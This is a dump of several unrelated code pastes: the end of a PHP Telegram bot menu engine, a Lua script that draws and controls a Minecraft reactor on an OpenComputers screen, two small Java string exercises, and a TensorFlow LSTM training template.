         * Метод для получения действия кнопки меню по сообщению (только если кнопка затронута)
         * @param string $Text Текст сообщения
         * @param Menu $Menu Меню
         * @return callable Действие
         */
        private function GetKeyboardActionFromMessage(string $Text, Menu $Menu) : ?callable
        {
            if(is_array($Menu->Buttons)) {
                foreach($Menu->Buttons as $Row) {
                    foreach($Row as $Button) {
                        if($Button->Title == $Text) return $Button->Action;
                    }
                }
            }
            return null;
        }

        /**
         * Метод для преобразование кнопок в клавиатуру Telegram
         * @param array $Buttons Массив кнопок
         * @return array Клавиатура
         */
        private function KBFromButtons(array $Buttons) : array
        {
            $Keyboard = [];
            if(is_array($Buttons)) {
                foreach($Buttons as $Row) {
                    $RowButtons = [];
                    foreach($Row as $Button) {
                        $RowButtons[] = $Button->Title;
                    }
                    $Keyboard[] = $RowButtons;
                }
            }
            return $Keyboard;
        }

        /**
         * Метод для навигации в нужное меню
         * @param string $Nav Имя меню
         * @param bool $Silent Не выполнять ли действие OnLoad
         */
        public function NavTo(string $Nav, bool $Silent = false)
        {
            DAL::SetNav($Nav, $this->Message->uID, $this->DB);
            DAL::SetLastMediaGroup(""-1"", $this->Message->uID, $this->DB);
            if($Silent) return;
            $CurrentMenu = $this->GetMenuByName($Nav);
            $Action = $CurrentMenu->OnLoad;
            $this->Message->Text = ""/init"";
            $this->Keyboard = $this->KBFromButtons($CurrentMenu->Buttons);
            call_user_func($Action, $this->Message, $this);
            DAL::SetNav($Nav, $this->Message->uID, $this->DB);
        }

        /**
         * Метод для изменения кеша
         * @param $cache Кеш
         */
        public function SetCache($cache)
        {
            DAL::SetCache($cache, $this->Message->uID, $this->DB);
        }

        /**
         * Метод для получения кеша
         * @return mixed Кеш
         */
        public function GetCache()
        {
            return DAL::GetCache($this->Message->uID, $this->DB);
        }

        /**
         * Метод для навигации в Главное Меню
         * @param bool $Silent Не выполнять ли действие OnLoad
         */
        public function NavToRoot(bool $Silent = false)
        {
            $this->NavTo($this->RootMenu, $Silent);
        }

        /**
         * Метод для обработки ошибки
         * @param string $message Сообщение ошибки
         */
        public function OnError(string $message)
        {
            $this->Log->RequestFail(500, $message);
            $this->Send(""🐘 *Ошибка PHP:* \n\n"" . $message);
            exit();
        }
        /**
         * Метод для получения ссылки на корневую директорию бота
         * @param string Ссылка
         */
        public function GetURL() : string
        {
            $protocol = stripos($_SERVER['SERVER_PROTOCOL'],'https') === 0 ? 'https:' : 'http:';
            $dir = dirname($_SERVER['SCRIPT_NAME']);
            return $protocol . '//' . $_SERVER['HTTP_HOST'] . $dir . '/';
        }
        /**
         * Задание действия для обработки события появления инлайнового запроса
         * @param callable $Action Действие
         */
        public function OnInlineQuery($Action)
        {
            $this->InlineQueryAction = $Action;
        }
        /**
         * Задание действия для обработки события появления запроса на подтверждение оплаты
         * @param callable $Action Действие
         */
        public function OnPreCheckoutQuery($Action)
        {
            $this->PreCheckoutQueryAction = $Action;
        }
        /**
         * Метод для получения навигации
         * @return string Навигация
         */
        public function GetNav() : string
        {
            return DAL::GetNav($this->Message->uID, $this->DB);
        }
        /**
         * Метод для инициализации движка
         */
        public function Init()
        {
            if(!$this->isInline && !$this->isPreCheckout) {
                if($this->Message->Text == ""/reset"" || $this->Message->Text == ""/start"") {
                    DAL::SetNav($this->RootMenu, $this->Message->uID, $this->DB);
                }
                $Nav = DAL::GetNav($this->Message->uID, $this->DB);
                if(empty($Nav)) $Nav = $this->RootMenu;
                DAL::SetNav($Nav, $this->Message->uID, $this->DB);
                $this->Nav = $Nav;
                
                $CurrentMenu = $this->GetMenuByName($this->Nav);
                if($CurrentMenu != null) {
                    $KeyboardAction = $this->GetKeyboardActionFromMessage($this->Message->Text, $CurrentMenu);
                    
                    if($this->Message->isPay) {
                        $action = $CurrentMenu->OnPay;
                    } else {
                        if($KeyboardAction != null) {
                            $action = $KeyboardAction;
                        } else {
                            $action = $CurrentMenu->OnLoad;
                        }
                    }
                    
                    $this->Keyboard = $this->KBFromButtons($CurrentMenu->Buttons);

                    if(is_callable($action)) {
                        call_user_func($action, $this->Message, $this);
                    }
                } else {
                    $this->Send(""Меню не найдено."");
                }
            } else if($this->isInline) {
                if(is_callable($this->InlineQueryAction)) { 
                    call_user_func($this->InlineQueryAction, $this->InlineQuery, $this);       
                }
            } else if($this->isPreCheckout) {
                if(is_callable($this->PreCheckoutQueryAction)) { 
                    call_user_func($this->PreCheckoutQueryAction, $this->PreCheckoutQuery, $this);       
                }
            }
            $this->Log->RequestSuccess();
        }
    }
?>"
cBYNeEv4,draw.lua,Nikit_OS,Lua,Wednesday 28th of June 2023 01:42:22 PM CDT,"local event = require ""event""
local component = require ""component""
local reactor = component.reactor_chamber
local redstone = component.redstone
--local menet = component.proxy(component.get(""d57""))
local gpu = component.gpu
local w, h = gpu.getResolution()
local inv = component.inventory_controller
local invs = inv.getInventorySize(0)
local power = 0
local changing = false
local rods = {}
local ri=1
local lzhs = {}
local li=1
local vents = {}
local vi=1
local warn=false

function getElement(pos)
  local l="" ""
  if inv.getStackInSlot(2,pos) then
    l=inv.getStackInSlot(2,pos)
  end
  return l
end

function fillDmg(i,j,el,dmg)
  if el==""LZH"" then
    dmg=(100000-dmg)/10000
  elseif el==""Rod"" then
    dmg=(20000-dmg)/2000
  elseif el==""Vent"" then
    dmg=(1000-dmg)/100
  end
  gpu.setBackground(0xFF0000)
  gpu.fill(j+2,i+5,dmg,1,"" "")
  gpu.setBackground(0x1E1E1E)
  gpu.fill(j+2+dmg,i+5,10-dmg,1,"" "")
end

function checkDmg()
  local dmg=0
  for i=1,li-1,1 do
    if inv.getStackInSlot(2,lzhs[i][3]) then
      dmg=inv.getStackInSlot(2,lzhs[i][3]).customDamage
      fillDmg(lzhs[i][1],lzhs[i][2],""LZH"",dmg)
    else
      fillDmg(lzhs[i][1],lzhs[i][2],""LZH"",100000)
    end
  end  
  local r
  for i=1,ri-1,1 do
    r=inv.getStackInSlot(2,rods[i][3])
    if r and not string.match(r.label,""Depleted"") then
      dmg=inv.getStackInSlot(2,rods[i][3]).customDamage
      fillDmg(rods[i][1],rods[i][2],""Rod"",dmg)
    else
      fillDmg(rods[i][1],rods[i][2],""Rod"",20000)
    end
  end  
  for i=1,vi-1,1 do
    if inv.getStackInSlot(2,vents[i][3]) then
      dmg=inv.getStackInSlot(2,vents[i][3]).customDamage
      fillDmg(vents[i][1],vents[i][2],""Vent"",dmg)
    else
      fillDmg(vents[i][1],vents[i][2],""Vent"",1000)
    end
  end  
end

function fillElement(i,j,el,pos,set,elw)
  local j1=9+j
  local i1=2+i
  set=set or 0x696969
  pos=pos or 1
  elw=elw or 14
  gpu.setBackground(set)
  gpu.fill(j1,i1,elw,6,"" "")
  local l="" ""
  if el.label then
    l=el.label
  end
  if el==""X"" then
    gpu.setForeground(0x3C3C3C)
    gpu.fill(j1+1,i1,1,1,""＼"")
    gpu.fill(j1+11,i1,1,1,""／"")
    gpu.fill(j1+3,i1+1,1,1,""＼"")
    gpu.fill(j1+9,i1+1,1,1,""／"")
    gpu.fill(j1+5,i1+2,1,1,""＼"")
    gpu.fill(j1+7,i1+2,1,1,""／"")
    gpu.fill(j1+7,i1+3,1,1,""＼"")
    gpu.fill(j1+5,i1+3,1,1,""／"")
    gpu.fill(j1+9,i1+4,1,1,""＼"")
    gpu.fill(j1+3,i1+4,1,1,""／"")
    gpu.fill(j1+11,i1+5,1,1,""＼"")
    gpu.fill(j1+1,i1+5,1,1,""／"")
  elseif el==""0"" then
    gpu.fill(j1+1,i1,6,1,""═"")
    gpu.fill(j1+1,i1+5,6,1,""═"")
    gpu.fill(j1,i1+1,1,4,""║"")
    gpu.fill(j1+7,i1+1,1,4,""║"")
  elseif el==""1"" then
    gpu.fill(j1+7,i1+1,1,4,""║"")
  elseif el==""2"" then
    gpu.fill(j1+1,i1,6,1,""═"")
    gpu.fill(j1+1,i1+2,6,1,""═"")
    gpu.fill(j1+1,i1+5,6,1,""═"")
    gpu.fill(j1,i1+3,1,2,""║"")
    gpu.fill(j1+7,i1+1,1,1,""║"")
  elseif el==""3"" then
    gpu.fill(j1+1,i1,6,1,""═"")
    gpu.fill(j1+1,i1+2,6,1,""═"")
    gpu.fill(j1+1,i1+5,6,1,""═"")
    gpu.fill(j1+7,i1+3,1,2,""║"")
    gpu.fill(j1+7,i1+1,1,1,""║"")
  elseif el==""4"" then
    gpu.fill(j1+1,i1+2,6,1,""═"")
    gpu.fill(j1,i1+1,1,1,""║"")
    gpu.fill(j1+7,i1+1,1,1,""║"")
    gpu.fill(j1+7,i1+3,1,2,""║"")
  elseif el==""5"" then
    gpu.fill(j1+1,i1,6,1,""═"")
    gpu.fill(j1+1,i1+2,6,1,""═"")
    gpu.fill(j1+1,i1+5,6,1,""═"")
    gpu.fill(j1,i1+1,1,1,""║"")
    gpu.fill(j1+7,i1+3,1,2,""║"")
  elseif el==""6"" then
    gpu.fill(j1+1,i1,6,1,""═"")
    gpu.fill(j1+1,i1+2,6,1,""═"")
    gpu.fill(j1+1,i1+5,6,1,""═"")
    gpu.fill(j1,i1+1,1,1,""║"")
    gpu.fill(j1,i1+3,1,2,""║"")
    gpu.fill(j1+7,i1+3,1,2,""║"")
  elseif el==""7"" then
    gpu.fill(j1+1,i1,6,1,""═"")
    gpu.fill(j1+7,i1+1,1,4,""║"")
  elseif el==""8"" then
    gpu.fill(j1+1,i1,6,1,""═"")
    gpu.fill(j1+1,i1+2,6,1,""═"")
    gpu.fill(j1+1,i1+5,6,1,""═"")
    gpu.fill(j1,i1+1,1,1,""║"")
    gpu.fill(j1+7,i1+1,1,1,""║"")
    gpu.fill(j1,i1+3,1,2,""║"")
    gpu.fill(j1+7,i1+3,1,2,""║"")
  elseif el==""9"" then
    gpu.fill(j1+1,i1,6,1,""═"")
    gpu.fill(j1+1,i1+2,6,1,""═"")
    gpu.fill(j1+1,i1+5,6,1,""═"")
    gpu.fill(j1,i1+1,1,1,""║"")
    gpu.fill(j1+7,i1+3,1,2,""║"")
    gpu.fill(j1+7,i1+1,1,1,""║"")
  elseif string.match(l,""LZH"") then
    gpu.setBackground(0x0000C0)
    gpu.fill(j1+1,i1+1,12,4,"" "")
    fillDmg(i1,j1,""LZH"",el.customDamage)
    lzhs[li]={i1,j1,pos}
    li=li+1
  elseif string.match(l,""Overclocked"") then
    gpu.setBackground(0xFFFF40)
    gpu.fill(j1+1,i1+1,12,4,"" "")
    fillDmg(i1,j1,""Vent"",el.customDamage)
    vents[vi]={i1,j1,pos}
    vi=vi+1
  elseif string.match(l,""Quad"") then
    gpu.setBackground(0x006D00)
    gpu.fill(j1+1,i1+1,2,4,"" "")
    gpu.fill(j1+4,i1+1,2,4,"" "")
    gpu.fill(j1+8,i1+1,2,4,"" "")
    gpu.fill(j1+11,i1+1,2,4,"" "")
    if not string.match(l,""Depleted"") then
      fillDmg(i1,j1,""Rod"",el.customDamage)
    else
      fillDmg(i1,j1,""Rod"",20000)
    end
    rods[ri]={i1,j1,pos}
    ri=ri+1
  elseif string.match(l,""Plating"") then
    gpu.setBackground(0xB4B4B4)
    gpu.fill(j1+1,i1+1,12,4,"" "")
  end
end

function drawElement(i,j)
  local i1=i/7
  local j1=j/16+1
  local pos=i1*9+j1
  local s=(invs-4)/6
  if s<9 then
    for g=8,s,-1 do
      local m=math.fmod(pos,g+1)
      if m==0 then
        fillElement(i,j,""X"")
        return 
      end
      local d=(pos-m)/(g+1)
      pos=pos-d
    end
  end
  local el=getElement(pos)
  fillElement(i,j,el,pos)
end

function fillEU(eu)
  gpu.setBackground(0x000000)
  gpu.fill(88,44,72,6,"" "")
  gpu.setForeground(0x00B6FF)
  local l = string.len(eu)
  for i=l,1,-1 do
    fillElement(42,140-(l-i)*10,string.sub(eu,i,i),1,0x000000,10)
  end
end

function fillPower(power)
  if power>0 then
    gpu.setBackground(0x00FF00)
  else
    gpu.setBackground(0xFF0000)
  end
  gpu.fill(2,45,14,5,"" "")
end

function fillWarning(w)
  gpu.setBackground(w)
  gpu.fill(18,45,14,5,"" "")
end

function continueWork()
  if reactor.getHeat()>0 then
    power=0
    redstone.setOutput(1,power)
    --menet.setOutput(2,15)
    fillPower(power)
    fillWarning(0xFFB600)
    fillEU(0)
    warn=true
    return true
  end
  local eu = reactor.getReactorEUOutput()
  if changing then
    if   not inv.getStackInSlot(2,11) or (inv.getStackInSlot(2,11) and string.match(inv.getStackInSlot(2,11).label,""Depleted""))
      or not inv.getStackInSlot(2,12) or (inv.getStackInSlot(2,12) and string.match(inv.getStackInSlot(2,12).label,""Depleted""))
      or not inv.getStackInSlot(2,15) or (inv.getStackInSlot(2,15) and string.match(inv.getStackInSlot(2,15).label,""Depleted""))
      or not inv.getStackInSlot(2,16) or (inv.getStackInSlot(2,16) and string.match(inv.getStackInSlot(2,16).label,""Depleted""))
      or not inv.getStackInSlot(2,20) or (inv.getStackInSlot(2,20) and string.match(inv.getStackInSlot(2,20).label,""Depleted""))
      or not inv.getStackInSlot(2,21) or (inv.getStackInSlot(2,21) and string.match(inv.getStackInSlot(2,21).label,""Depleted""))
      or not inv.getStackInSlot(2,24) or (inv.getStackInSlot(2,24) and string.match(inv.getStackInSlot(2,24).label,""Depleted""))
      or not inv.getStackInSlot(2,25) or (inv.getStackInSlot(2,25) and string.match(inv.getStackInSlot(2,25).label,""Depleted""))
      or not inv.getStackInSlot(2,29) or (inv.getStackInSlot(2,29) and string.match(inv.getStackInSlot(2,29).label,""Depleted""))
      or not inv.getStackInSlot(2,30) or (inv.getStackInSlot(2,30) and string.match(inv.getStackInSlot(2,30).label,""Depleted""))
      or not inv.getStackInSlot(2,33) or (inv.getStackInSlot(2,33) and string.match(inv.getStackInSlot(2,33).label,""Depleted""))
      or not inv.getStackInSlot(2,34) or (inv.getStackInSlot(2,34) and string.match(inv.getStackInSlot(2,34).label,""Depleted""))
      or not inv.getStackInSlot(2,38) or (inv.getStackInSlot(2,38) and string.match(inv.getStackInSlot(2,38).label,""Depleted""))
      or not inv.getStackInSlot(2,39) or (inv.getStackInSlot(2,39) and string.match(inv.getStackInSlot(2,39).label,""Depleted""))
      or not inv.getStackInSlot(2,42) or (inv.getStackInSlot(2,42) and string.match(inv.getStackInSlot(2,42).label,""Depleted""))
      or not inv.getStackInSlot(2,43) or (inv.getStackInSlot(2,43) and string.match(inv.getStackInSlot(2,43).label,""Depleted""))
      or not inv.getStackInSlot(2,51) or (inv.getStackInSlot(2,51) and string.match(inv.getStackInSlot(2,51).label,""Depleted""))
      or not inv.getStackInSlot(2,52) or (inv.getStackInSlot(2,52) and string.match(inv.getStackInSlot(2,52).label,""Depleted"")) then
      return true --do nothing
    else
      changing=false
      power=15
      redstone.setOutput(1,power)
      --menet.setOutput(2,power)
      fillWarning(0x000000)
    end
  else
    if eu<2000 and power>0 then
      changing=true
      power=0
      redstone.setOutput(1,power)
      --menet.setOutput(2,power)
      fillWarning(0x006D00)
      fillEU(0)
      return true
    end
  end
  fillEU(eu)
  checkDmg()
  return true
end

local myEventHandlers = setmetatable({}, { __index = function() return continueWork end })

function myEventHandlers.key_up(adress, char, code, playerName)
  if code==57 then
    if not changing then
      if power==0 then
        --print(""Enable"")
        if warn then
          warn=false
          fillWarning(0x000000)
        end
        power=15
      else
        --print(""Shutdown"")
        power=0
      end
      fillPower(power)
      redstone.setOutput(1,power)
      --menet.setOutput(2,power)
    end
  end
  return true
end

function myEventHandlers.interrupted(...)
  gpu.setForeground(0xFFFFFF)
  gpu.setBackground(0x000000)
  gpu.fill(1, 1, w, h, "" "")
  return false
end
 
function handleEvent(eventID, ...)
  if (eventID) then 
    return myEventHandlers[eventID](...)
  end
  return continueWork()
end

gpu.setBackground(0xC3C3C3)

gpu.fill(1, 1, w, h-7, "" "")

for i=0,35,7 do
  for j=0,128,16 do
    drawElement(i,j)
  end
end

if reactor.getReactorEUOutput()>0 then
  power=15
end
fillPower(power)
while handleEvent(event.pull(1)) do
  --nothing
end"
iPAGLRPj,04. Word Filter,veronikaaa86,Java,Wednesday 28th of June 2023 01:34:52 PM CDT,"package associativeArrays;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.Scanner;

public class P04WordFilter {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);

        String[] wordsArr = Arrays.stream(scanner.nextLine().split("" ""))
                .filter(w -> w.length() % 2 == 0)
                .toArray(String[]::new);


        System.out.println(String.join(System.lineSeparator(), wordsArr));


//        String[] wordsArr = scanner.nextLine().split("" "");
//
//        ArrayList<String> resultList = new ArrayList<>();
//        for (String item : wordsArr) {
//            if (item.length() % 2 == 0) {
//                resultList.add(item);
//            }
//        }
//
//        System.out.println(String.join(System.lineSeparator(), resultList));
    }
}
"
7uvvdC4b,Untitled,bgabrovsek,Python,Wednesday 28th of June 2023 01:30:50 PM CDT,"import tensorflow as tf
from tensorflow.keras.layers import LSTM, Dense
from tensorflow.keras.models import Sequential

# Step 1: Prepare your data
# Assume you have a list of sequences and corresponding labels

sequences = [...]  # List of input sequences
labels = [...]  # List of corresponding labels

# Step 2: Data Transformation and Augmentation
def augment_sequence(sequence):
    # Custom data augmentation function
    # Implement your own data augmentation logic here
    augmented_sequence = ...  # Perform data augmentation on the sequence
    return augmented_sequence

def preprocess_data(sequence, label):
    sequence = tf.convert_to_tensor(sequence, dtype=tf.float32)
    sequence = augment_sequence(sequence)  # Apply data augmentation
    return sequence, label

dataset = tf.data.Dataset.from_tensor_slices((sequences, labels))
dataset = dataset.map(preprocess_data)

# Step 3: Data Loading
batch_size = 32

dataset = dataset.shuffle(buffer_size=len(sequences))
dataset = dataset.batch(batch_size)
dataset = dataset.prefetch(buffer_size=tf.data.experimental.AUTOTUNE)

# Step 4: Define the LSTM model
model = Sequential()
model.add(LSTM(64, input_shape=(92, 1)))
model.add(Dense(1, activation='sigmoid'))

# Step 5: Compile the model
model.compile(optimizer='adam', loss='binary_crossentropy', metrics=['accuracy'])

# Step 6: Training Loop
num_epochs = 10

for epoch in range(num_epochs):
    print(""Epoch"", epoch + 1)
    iterator = iter(dataset)

    try:
        while True:
            batch_data = next(iterator)
            X = tf.expand_dims(batch_data[0], axis=-1)
            y = batch_data[1]

            model.train_on_batch(X, y)

    except StopIteration:
        pass  # End of dataset

# Once the training is complete, you can save the model or use it for predictions.
"
NeWLifx1,03. Odd Occurrences,veronikaaa86,Java,Wednesday 28th of June 2023 01:07:42 PM CDT,"package associativeArrays;

import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.Scanner;

public class P03OddOccurrences {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);

        String[] inputArr = scanner.nextLine().split("" "");

        LinkedHashMap<String, Integer> wordsMap = new LinkedHashMap<>();

        for (String word : inputArr) {
            word = word.toLowerCase();

            wordsMap.putIfAbsent(word, 0);
            wordsMap.put(word, wordsMap.get(word) + 1);

//            -v.01-
//            if (wordsMap.containsKey(word)) {
//                wordsMap.put(word, wordsMap.get(word) + 1);
//            } else {
//                wordsMap.put(word, 1);
//            }

//            -v.01-
//            if (!wordsMap.containsKey(word)) {
//                wordsMap.put(word, 0);
//            }
//
//            wordsMap.put(word, wordsMap.get(word) + 1);
        }

        ArrayList<String> resultList = new ArrayList<>();
        for (Map.Entry<String, Integer> entry : wordsMap.entrySet()) {
            if (entry.getValue() % 2 != 0) {
                resultList.add(entry.getKey());
            }
        }

        System.out.println(String.join("", "", resultList));

    }
}
"
